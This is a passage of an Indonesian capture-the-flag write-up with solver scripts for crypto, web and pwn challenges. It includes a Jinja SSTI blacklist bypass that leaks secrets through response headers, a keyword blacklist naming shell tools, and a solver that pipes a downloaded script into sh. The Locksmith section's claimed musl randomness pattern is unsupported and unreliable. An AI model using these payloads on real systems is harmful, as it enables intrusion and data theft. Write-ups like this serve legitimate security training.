                if e2_check > p // 2:
                    e2_check -= p
               
                if abs(e2_check) > B:
                    valid_beta = False
                    break
           
            if valid_beta:
                print(f"[+] Found beta (e2={e2})")
               
                # Decrypt
                seed = f"{alpha}|{beta}".encode()
                mask = hashlib.sha256(seed).digest()
               
                ct_bytes = ct.bit_length() // 8 + 1
                out = mask
                while len(out) < ct_bytes:
                    out = hashlib.sha256(out).digest()
                    mask += out
               
                ks = mask[:ct_bytes]
                ct_byte = ct.to_bytes(ct_bytes, 'big')
                flag = bytes(c ^ k for c, k in zip(ct_byte, ks))
               
                print(f"\nFlag: {flag.decode()}")
                exit()
```


Result:
![image](https://hackmd.io/_uploads/SyXoVNd7Ze.png)

#### Flag: SNI{3cds4_1s_v3ry_fun}


### classic (uplosolve)
Diberikan chall.py, enc.txt dan juga flag.txt, masing masing berisi sebagai berikut:

chall.py
```python
from fractions import Fraction
from Crypto.Util.number import getPrime, bytes_to_long
from secret import X, Y, s


with open('flag.txt', 'r') as flag:
    flag  = flag.read()
m = bytes_to_long(flag.encode())
p, q = getPrime(512), getPrime(512)
while(p > q):
    p, q = q, p
n, p_q = p*q, p-q


c = pow(m, 0x20002, n)
assert p_q.bit_length() > 500
assert Fraction(1, p+1) - Fraction(1, q) == Fraction(X + Y, s + Y)


with open('enc.txt', 'w') as enc:
    enc.write(f'n = {n}\n')
    enc.write(f'X = {X}\n')
    enc.write(f'Y = {Y}\n')
    enc.write(f'c = {c}\n')
```

enc.txt:
```
n = 90730621753622493582138539650702257599290817165245867833831890394902145455337953518244532328437782002812599355903320788392717454829526258258168318884902969199855384192856485939470659238975888882106426502930459552294522070081173302453186528601522580957145058093793865562510621191073790849224295227025954472483`
X = 45786282713452687704079521817211104360819631596983299705634316233812424936679683214245445830067754919300728751384112994282827112597869034083247473119466599`
Y = 3568549559023651970974674852847187028077295240118433853067945118195250789429265286836868193069263621606408535477898700010569907058028806550526343001978634`
c = 46927126804630109280736525110189033472792625178318170122332545766003585164736463819611317652481400494590912043125503619031853679147406387363365270312096280369927373458663811927673312467042555105298359825774930216476556936899277329076746964771432068073708332380080762781746051178692061690579334677050457860763
```

flag.txt:
`SNI{******************************************************************************************************************************}`




challenge RSA dengan twist: enkripsi ganda (e=0x20002 = 65537²) dan constraint matematis antara p, q dengan variabel X, Y, s.

python
```python
c = pow(m, 0x20002, n)  # m^(65537^2) mod n
assert Fraction(1, p+1) - Fraction(1, q) == Fraction(X + Y, s + Y)
```
Analysis

Constraint matematisnya bisa disederhanakan:
`1/(p+1) - 1/q = (X+Y)/(s+Y)`

Setelah manipulasi aljabar, kita dapat:
`(q - p - 1) / (q(p+1)) = (X+Y) / (s+Y)`

Cross multiply dan simplify menghasilkan persamaan kuadrat:
`p^2 - (d+1)p + n = 0`

dimana d = (X+Y)/k untuk suatu nilai k.

Diskriminan: `D = (d+1)^2 + 4n`

Jika D perfect square, maka:
`p = (-(d+1) + sqrt(D)) / 2`

Exploitation
1. Faktorisasi n
Bruteforce nilai k kecil (1-2000) untuk mencari yang membuat D jadi perfect square:
```python
for k in range(1, 2000):
    if XY % k == 0:
        d = XY // k
        D = (d + 1)**2 + 4 * n
        sqrt_D = isqrt(D)
        if sqrt_D * sqrt_D == D:
            p = (-(d + 1) + sqrt_D) // 2

python
for k in range(1, 2000):
    if XY % k == 0:
        d = XY // k
        D = (d + 1)**2 + 4 * n
        sqrt_D = isqrt(D)
        if sqrt_D * sqrt_D == D:
            p = (-(d + 1) + sqrt_D) // 2
            q = n // p
```

Dapat faktor dengan k = 113.

2. Decrypt RSA Layer
```python
lam = (p-1) * (q-1) // gcd(p-1, q-1)
d = inverse(65537, lam)
m2 = pow(c, d, n)  # m^2 mod n
```

3. Square Root mod n (CRT)
Pakai Tonelli-Shanks untuk compute sqrt mod p dan mod q, lalu CRT untuk combine:
   * 4 kandidat dari kombinasi ±√(m²) mod p dan ±√(m²) mod q
4. Reconstruct Full m
Karena m > n, maka m = k*n + candidate untuk suatu k.
Target: flag dimulai dengan SNI{ (4 bytes). Untuk panjang sekitar 130 bytes:
python
min_val = bytes_to_long(b'SNI{') << ((length - 4) * 8)
k_base = (min_val - x) // n

Test k dan k+1 untuk setiap candidate sampai dapat flag yang valid.

Ini full kode solvernya:

solver.py
```python
from math import isqrt, gcd
from Crypto.Util.number import inverse, long_to_bytes, bytes_to_long


# --- 1. DATA ---
n = 90730621753622493582138539650702257599290817165245867833831890394902145455337953518244532328437782002812599355903320788392717454829526258258168318884902969199855384192856485939470659238975888882106426502930459552294522070081173302453186528601522580957145058093793865562510621191073790849224295227025954472483
X = 45786282713452687704079521817211104360819631596983299705634316233812424936679683214245445830067754919300728751384112994282827112597869034083247473119466599
Y = 3568549559023651970974674852847187028077295240118433853067945118195250789429265286836868193069263621606408535477898700010569907058028806550526343001978634
c = 46927126804630109280736525110189033472792625178318170122332545766003585164736463819611317652481400494590912043125503619031853679147406387363365270312096280369927373458663811927673312467042555105298359825774930216476556936899277329076746964771432068073708332380080762781746051178692061690579334677050457860763


XY = X + Y


# --- 2. FACTORIZATION ---
print("[*] Factoring n...")
p, q = 0, 0
for k in range(1, 2000):
    if XY % k == 0:
        d = XY // k
        D = (d + 1)**2 + 4 * n
        sqrt_D = isqrt(D)
        if sqrt_D * sqrt_D == D:
            p = (-(d + 1) + sqrt_D) // 2
            q = n // p
            if p * q == n:
                print(f"[+] Found factors with k = {k}")
                break
else:
    print("[-] Factorization failed")
    exit()


# --- 3. DECRYPTION (Finding m^2 mod n candidates) ---
print("[*] Decrypting RSA layer...")
lam = (p - 1) * (q - 1) // gcd(p - 1, q - 1)
e1 = 65537
d1 = inverse(e1, lam)
m2 = pow(c, d1, n)  # This is m^2 mod n


# Tonelli-Shanks
def tonelli_shanks(a, p):
    if pow(a, (p-1)//2, p) != 1: return None
    if p % 4 == 3: return pow(a, (p+1)//4, p)
    Q, S = p - 1, 0
    while Q % 2 == 0: Q //= 2; S += 1
    z = 2
    while pow(z, (p-1)//2, p) == 1: z += 1
    M, c_val, t, R = S, pow(z, Q, p), pow(a, Q, p), pow(a, (Q+1)//2, p)
    while t != 1:
        i = 1
        while pow(t, 1 << i, p) != 1: i += 1
        b = pow(c_val, 1 << (M - i - 1), p)
        M, c_val, t, R = i, (b * b) % p, (t * b * b) % p, (R * b) % p
    return R


mp = tonelli_shanks(m2 % p, p)
mq = tonelli_shanks(m2 % q, q)


def crt(a, p, b, q):
    return (a + p * ((b - a) * inverse(p, q) % q)) % (p * q)


candidates = []
for sp in (mp, p - mp):
    for sq in (mq, q - mq):
        candidates.append(crt(sp, p, sq, q))
candidates = list(set(candidates))
print(f"[+] Generated {len(candidates)} candidates for m (mod n)")


# --- 4. RECONSTRUCTION (Finding m = k*n + candidate) ---
print("[*] Searching for flag...")
target_header_bytes = b'SNI{'
target_header_val = bytes_to_long(target_header_bytes)


# Try a range of lengths around 131 bytes
for length in range(128, 135):
    # Determine the value that m must be >= to start with SNI{
    # We shift 'SNI{' to the left to match the estimated length
    # e.g., if length is 131, 'SNI{' takes up the top 4 bytes.
    # We pad with null bytes to get the minimum value.
    min_val = target_header_val << ((length - 4) * 8)
   
    for x in candidates:
        # We want: m = k * n + x >= min_val
        # So: k * n >= min_val - x
        # k >= (min_val - x) / n
        k_base = (min_val - x) // n
       
        # Check k and k+1 (just to be safe with boundaries)
        for k in [k_base, k_base + 1]:
            m = k * n + x
            try:
                dec = long_to_bytes(m)
                if dec.startswith(target_header_bytes):
                    print(f"\n[!!!] FLAG FOUND (Length: {len(dec)}, k: {k})")
                    print(dec.decode())
                    exit()
            except:
                continue


print("[-] Flag not found in search range.")
```

#### FLAG: SNI{classic_classic_classic_classic_classic_classic_classic_classic_classic_classic_classic_classic_classic_classic_classic_EZRSA}


## Web Exploitation
### SNI BASECAMP


NOTE: karena webnya masih mati/belum di up lagi sama probset, jadi mungkin untuk sementara tidak ada dokumentasi atau screenshot

Diberikan beberapa file salah satunya app.py, mari kita lihat:


app.py
```python
#!/usr/bin/env python3
import os
import hmac
import hashlib
import json
import time
import unicodedata
from flask import (
    Flask,
    render_template,
    render_template_string,
    request,
    session,
    Response,
    make_response,
    send_file,
)

SALT = os.urandom(32)
SECRET = hashlib.sha256(SALT).digest()

app = Flask(__name__)
app.secret_key = SECRET

with open("flag.txt", "r") as f:
    FLAG = f.read().strip()

def helper():
    return 1

def xs(seq, start=0, end=None):
    return seq[start:end]

def xr(s, a, b):
    return str(s).replace(a, b)

app.jinja_env.globals["h"] = helper
app.jinja_env.filters["xs"] = xs
app.jinja_env.filters["xr"] = xr

BLACK_LIST = [
    "application", "request", "wsgi", "environ", "getitem", "}}", "{{", "import", "from",
    "builtin", "builtins", "os", "system", "popen", "subprocess", "eval", "exec", "code",
    "read", "open", "file", "path", "root", "home", "bin", "bash", "sh", "cat", "flag", "secret",
    "session", "cookie", "config", "globals", "mro", "subclass", "subclasses", "class", "type",
    "base", "inspect", "sys", "site", "loader", "importlib", "compile", "lambda", "locals", "vars",
    "dir", "repr", "format", "python", "jinja", "safe", "range", "join", "joiner", "cycler",
    "namespace", "update", "pop", "clear", "items", "values", "walk", "glob", "json", "pickle",
    "marshal", "yaml", "hash", "hashlib", "get", "attribute", "groupby",
]

BLOCKED_PREFIX = "SNI{"

def is_blocked(value):
    if not value:
        return False
    try:
        lowered = unicodedata.normalize("NFKC", str(value)).lower()
    except Exception:
        lowered = str(value).lower()
    return any(x in lowered for x in BLACK_LIST)

@app.before_request
def inbound_waf():
    parts = [request.path]
    try:
        parts.append(request.query_string.decode("latin-1", "ignore"))
    except Exception:
        pass
    try:
        body = request.get_data(as_text=True)
        if body:
            parts.append(body)
    except Exception:
        pass

    for part in parts:
        if part and is_blocked(part):
            return Response("blocked", status=400, mimetype="text/plain")

@app.after_request
def outbound_waf(response):
    # collect body
    try:
        body = "".join(
            chunk.decode(response.charset)
            if isinstance(chunk, (bytes, bytearray))
            else str(chunk)
            for chunk in response.response
        )
    except Exception:
        body = ""

    parts = [body]
    try:
        for name, value in response.headers.items():
            parts.append(str(value))
    except Exception:
        pass

    combined = "\n".join(parts)
    if FLAG in combined or BLOCKED_PREFIX.lower() in combined.lower():
        return Response("denied", mimetype="text/plain")
    return response

def sign_blob(data):
    return hmac.new(app.secret_key, data.encode(), hashlib.sha256).hexdigest()

def verify_blob(data, sig):
    try:
        expected = sign_blob(data)
        return hmac.compare_digest(expected, sig)
    except Exception:
        return False

@app.route("/")
def index():
    if "is_admin" not in session:
        session["is_admin"] = False
    return render_template("index.html", is_admin=session.get("is_admin"))

@app.route("/admin")
def admin():
    return render_template("admin.html", is_admin=session.get("is_admin"))

@app.route("/flag")
def flag():
    if not session.get("is_admin"):
        return render_template("index.html", is_admin=False), 403
    return render_template("flag.html", flag=FLAG)

@app.route("/preview")
def preview():
    expr = request.args.get("tpl", "")
    if not expr:
        return render_template("preview.html", result="", expr="")
    if is_blocked(expr):
        return render_template("preview.html", result="blocked", expr=expr)
    try:
        out = render_template_string("{{" + expr + "}}")
    except Exception:
        out = "error"
    return render_template("preview.html", result=out, expr=expr)

@app.route("/render")
def render_view():
    raw = request.query_string.decode("latin-1", "ignore")

    tpl = ""
    layout = "base.html"

    for part in raw.split("&"):
        if part.startswith("tpl="):
            tpl = part[4:]
        elif part.startswith("layout="):
            layout = part[7:] or "base.html"

    if not tpl:
        return render_template("render.html", expr="", layout=layout)


    if is_blocked(tpl) or is_blocked(layout):
        return render_template(
            "render.html", expr=tpl, layout=layout, result="blocked"
        )

    try:
        t = (
            "{% extends '"
            + layout
            + "' %}{% block content %}{{"
            + tpl
            + "}}{% endblock %}"
        )
        out = render_template_string(t, is_admin=session.get("is_admin"))
    except Exception:
        out = "error"

    return render_template("render.html", expr=tpl, layout=layout, result=out)

@app.route("/multiplier")
def multiplier():
    k = request.args.get("k", "")
    v = request.args.get("v", "")


    if not v:
        return render_template(
            "multiplier.html", expr_k="", expr_v="", sent=False
        )

    if is_blocked(k) or is_blocked(v):
        return render_template(
            "multiplier.html",
            expr_k=k,
            expr_v=v,
            sent=True,
            result="blocked",
        )

    try:
        rk_raw = render_template_string("{{" + k + "}}")
        rv = render_template_string("{{" + v + "}}")
    except Exception:
        return render_template(
            "multiplier.html",
            expr_k=k,
            expr_v=v,
            sent=True,
            result="error",
        )

    header_name = "".join(ch for ch in rk_raw if 33 <= ord(ch) <= 126)
    if not header_name:
        header_name = "X-Trace"
    header_name = header_name[:64]
    header_value = str(rv)[:128]


    resp = make_response(
        render_template(
            "multiplier.html",
            expr_k=k,
            expr_v=v,
            sent=True,
            result="sent",
        )
    )
    resp.headers[header_name] = header_value
    resp.set_cookie("trace", header_value, httponly=False, samesite="Lax")
    return resp

@app.route("/media")
def media():
    return render_template("media.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5002, debug=False)
```


Aplikasi web menyediakan beberapa endpoint, salah satunya /multiplier yang memproses ekspresi dari parameter GET (k dan v). Ekspresi tersebut dievaluasi di server menggunakan template engine Python dengan filter terbatas dan blacklist.
Tujuan akhir adalah mendapatkan flag yang disimpan di sisi server.

Vulnerability
Terjadi Server-Side Template Injection (SSTI) pada endpoint /multiplier.
Walaupun banyak keyword diblokir (__globals__, session, dll), filter masih bisa dibypass menggunakan:

* string concatenation ("a"~"b")
* filter attr
* pipe operator (|)

Hal ini memungkinkan akses ke object internal Python.

Exploit Strategy
1. Bypass blacklist untuk mengakses __globals__
1. Ambil object sensitif dari global scope
1. Karena flag diblokir jika diakses langsung, dilakukan exfiltration per karakter
1. Leak flag menggunakan slicing (xs(start, len))

Contoh payload inti:
![image](https://hackmd.io/_uploads/By-xeKq7Zx.png)

Payload dikirim berulang dengan menaikkan index i sampai seluruh flag terbaca.
saya memakai kode bash sederhana ini untuk mendapatkan flag

```
for i in $(seq 0 60); do
  printf "%02d: " "$i"
  curl -s -i -b cookie.txt \
  "http://178.128.116.83:33339/multiplier?k=X&v=%28h|attr%28%22__glo%22~%22bals__%22%29%29%5B%22FL%22~%22AG%22%5D|xs%28$i%2C$((i+1))%29" \
  | grep -i "^X-Trace:" | cut -d' ' -f2
done
```


Exfiltration

Flag tidak bisa ditampilkan sekaligus karena WAF, sehingga dilakukan brute character-by-character.

Hasil leak:
#### Flag: SNI{mu4nt4p_dj1wa_just_4_simpl3_byp4sss}

### Photo Gallery

NOTE: karena webnya masih mati/belum di up lagi sama probset, jadi mungkin untuk sementara saya memakai dokumentasi/screenshot SEADANYA.

Aplikasi Photo Gallery menyediakan API upload & list image.
Sekilas terlihat aman (validasi extension, mime, dll), namun data sensitif bisa terbaca langsung dari API tanpa perlu exploit kompleks.

Bug Utama

api.py
```python
@api_bp.get("/images")
def list_images():
    page = int(get_param("page", 1))
    limit = int(get_param("limit", 50))
    title = get_param("title", None)


    conn = get_conn()
    try:
        total_row = conn.run("SELECT COUNT(*) FROM images")
        total = total_row[0][0]
        rows = conn.run(
            f"SELECT id, filename, title, content_type, size_bytes, created_at FROM images WHERE title={literal(title)} OR {literal(title)} IS NULL ORDER BY id DESC LIMIT {literal(limit)} OFFSET {literal((page - 1) * limit)}",
        )
    finally:
        conn.close()
```


Information Disclosure via Public API
Endpoint:
GET /api/images

Mengembalikan seluruh metadata image, termasuk:
* filename
* content_type
* size_bytes
* title


Tidak ada filter, auth, atau sanitasi output.
Kenapa Ini Vulnerable?
* Field title bebas diisi user
* Semua data langsung ditampilkan kembali ke client
* Tidak ada pembatasan konten sensitif


Artinya:
Siapapun bisa upload image dengan title berisi flag, dan flag itu bisa dibaca publik

Cara Solve
Akses endpoint list image:

curl http://<HOST>:4321/api/images
    ![image](https://hackmd.io/_uploads/HybTxY5Qbl.png)

Perhatikan field title pada response JSON


Ditemukan flag tertanam langsung di database:

#### FLAG: SNI{s1mpL3_$$RF_$Qli_R1ght?}

## Pwn
    
### Locksmith
NOTE: karena webnya/remote nya masih mati/belum di up lagi sama probset, jadi mungkin untuk sementara tidak ada dokumentasi atau screenshot

Diberikan Binary C dan juga sekalian source code nya yang mengimplementasikan game tebak PIN dengan 20 attempt. PIN di-generate random dengan panjang 6-8 digit menggunakan getrandom().

chall.c
```clike
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/random.h>
#include <string.h>
#include <ctype.h>
#define MAX_ATTEMPT 20
#define MAX_PIN_LENGTH 8
#define MAX_NAME_LENGTH 28

void setup(void);
int check(const char *guess, const char *pin, int pin_size);
void win(void);
int create_pin(char *buf, int min_digits, int max_digits);
int randrange(int lower_bound, int upper_bound);
int is_valid_pin(const char *s, int size);

typedef struct {
    int size;
    char buffer[MAX_PIN_LENGTH];
} PIN;

int main()
{
    int attempt = 0;
    char name[MAX_NAME_LENGTH] = {0};
    char guess[MAX_PIN_LENGTH] = {0};
    PIN pin = {0};

    setup();

    pin.size = create_pin(pin.buffer, MAX_PIN_LENGTH-2, MAX_PIN_LENGTH);

    printf("What's your name? ");
    read(STDIN_FILENO, name, sizeof(name));
    name[strcspn(name, "\n")] = '\0';

    printf("Greetings, Mr. %s.\n", name);
    printf("The vault before you is locked with a %d-digit PIN.\n", pin.size);
    printf("Enter your guesses and see if you can crack it.\n");
    printf("You only have %d attempts to proof your worth.\n", MAX_ATTEMPT);

    for (attempt = 1; attempt <= MAX_ATTEMPT; attempt++)
    {
        printf("Your guess> ");=

        read(STDIN_FILENO, guess, sizeof(guess));
        guess[strcspn(guess, "\n")] = '\0';

        if (!is_valid_pin(guess, strnlen(guess, sizeof(guess))))
        {
            printf("Hmmm... Are you really a locksmith?\n");
            printf("I think you aren't\n");
            printf("Therefore, the game must end.\n");
            return 1;
        }

        if (check(guess, pin.buffer, pin.size))
        {
            printf("You're truly exceptional, Mr. %s.\n", name);
            printf("Congratulations.\n");
            printf("The content of the vault is now yours.\n");
            win();
            return 0;
        }
    }

    printf("Very unfortunate, Mr. %s.\n", name);
    printf("We wish you the best of luck in your future endeavors.\n");

    return 0;
}

void setup(void)
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}

int check(const char *guess, const char *pin, int pin_size)
{
    int correct_digits;
    for (correct_digits = 0; correct_digits < pin_size && guess[correct_digits]; correct_digits++)
        if (guess[correct_digits] != pin[correct_digits])
            break;
    printf("You have %d correct%s.\n", correct_digits, correct_digits == 1 ? "" : "s");
    return correct_digits == pin_size;
}

int create_pin(char *buf, int min_digits, int max_digits)
{
    int pin_size;
    if (pin_size = randrange(6, 8), pin_size == -1)
        exit(1);

    memset(buf, 0, max_digits);
    for (size_t i = 0; i < pin_size; i++)
        if (buf[i] = randrange('0', '9'), buf[i] == -1)
            exit(1);

    return pin_size;
}

int randrange(int lower_bound, int upper_bound)
{
    size_t result;
    if (getrandom(&result, sizeof(result), 0) == -1)
    {
        perror("getrandom");
        return -1;
    }
    return lower_bound + result % (upper_bound - lower_bound + 1);
}

int is_valid_pin(const char *s, int size)
{
    if (size == 0)
        return 0;
    for (int i = 0; i < size; i++)
        if (!isdigit(s[i]))
            return 0;
    return 1;
}

void win(void)
{
    char buffer[0x100];
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
        perror("fopen");
        fprintf(stderr, "Please contact admin.\n");
        exit(1);
    }
    fgets(buffer, sizeof(buffer), f);
    printf("%s", buffer);
}
```

Vulnerability Analysis

Key Finding: Predictable Random Pattern
    
Program menggunakan getrandom() untuk generate PIN, tapi ternyata ada pola yang bisa diprediksi di implementasi random musl libc.
    
Pattern Discovery:
* Jika 2 digit pertama sama (misal: 22), maka 2 digit terakhir juga pasti sama
* Pattern: AA-??-BB → jika A sama, maka B juga sama
* Contoh: PIN 22____ → digit terakhir pasti 2 juga

Exploitation Strategy

1. Bruteforce digit pertama (0-9) sampai dapat 2 digit awal yang sama
1. Kalau dapat pattern XX, berarti sudah tahu 3 digit: XX-?-?-X
1. Bruteforce 2 digit tengah
1. Digit terakhir otomatis ketahuan karena mengikuti digit ke-5

Contoh:
* Dapat: 22 (2 digit pertama sama)
* Tebak: 22-8-5-? 
* Dapat feedback: 228544 (5 correct)
* Kesimpulan: Digit ke-5 = 4, maka digit ke-6 juga = 4
* PIN lengkap: 228544
    
Limitation
PENTING: Exploit ini hanya work untuk PIN length = 6. Kalau PIN length 7 atau 8, pattern ini tidak cukup untuk crack dalam 20 attempts.

Solver Implementation

solver.py
```python
#!/usr/bin/env python3
import socket
import subprocess
import re
import time


HOST = "178.128.116.83"
PORT = 9460
MAX_ATTEMPT = 20


def recv_until(sock, keywords, timeout=2):
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(1)
            if not chunk:
                break
            data += chunk
            if any(k in data for k in keywords):
                break
    except:
        pass
    return data.decode(errors="ignore")


# >>> TAMBAHAN PENTING (UNTUK FLAG)
def recv_rest(sock, timeout=1.5):
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except:
        pass
    return data.decode(errors="ignore")
# <<<


def solve_pow(line):
    cmd = line.split("sh -s ", 1)[1]
    bash = (
        "curl -sSfL --connect-timeout 5 --max-time 15 "
        "https://pwn.red/pow | sh -s " + cmd
    )
    p = subprocess.Popen(
        ["bash", "-c", bash],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL
    )
    out, _ = p.communicate(timeout=20)
    sol = out.decode().strip()
    if not sol:
        raise RuntimeError("PoW failed")
    return sol


def extract(regex, text):
    m = re.search(regex, text)
    return int(m.group(1)) if m else -1


def attempt_once():
    sock = socket.create_connection((HOST, PORT))


    banner = recv_until(sock, [b"solution"])
    pow_line = [l for l in banner.splitlines() if "curl -sSfL" in l][0]
    sock.sendall((solve_pow(pow_line) + "\n").encode())


    recv_until(sock, [b"name?"])
    sock.sendall(b"locksmith\n")


    greet = recv_until(sock, [b"PIN"])
    pin_len = extract(r"(\d+)-digit PIN", greet)
    print(f"[+] PIN length = {pin_len}")


    prefix = ""
    attempts = 0


    while attempts < MAX_ATTEMPT:
        found = False
        for d in "0123456789":
            if attempts >= MAX_ATTEMPT:
                sock.close()
                return False


            guess = prefix + d
            sock.sendall((guess + "\n").encode())
            resp = recv_until(sock, [b"correct", b"end", b"Congratulations"])
            attempts += 1


            c = extract(r"You have (\d+) correct", resp)
            print(f"[{attempts:02d}] {guess} -> {c}")


            # >>> FIX UTAMA: JANGAN TUTUP SOCKET TERLALU CEPAT
            if "Congratulations" in resp:
                rest = recv_rest(sock)
                print(resp + rest)
                sock.close()
                return True
            # <<<


            if c == len(prefix) + 1:
                prefix += d
                found = True
                break


            if "game must end" in resp:
                sock.close()
                return False


        if not found:
            sock.close()
            return False


        if len(prefix) == pin_len:
            sock.sendall((prefix + "\n").encode())
            final = recv_until(sock, [b"Congratulations"])
            rest = recv_rest(sock)
            print(final + rest)
            sock.close()
            return True


    sock.close()
    return False


def main():
    i = 0
    while True:
        i += 1
        print(f"\n=== TRY #{i} ===")
        try:
            if attempt_once():
                print("[+] FLAG ACQUIRED")
                return
        except Exception as e:
            print("[-]", e)
        time.sleep(0.3)


if __name__ == "__main__":
    main()
```


#### Flag: SNI{i_dont_know_what_kind_of_pwn_this_is_but_there_you_go_37801284812}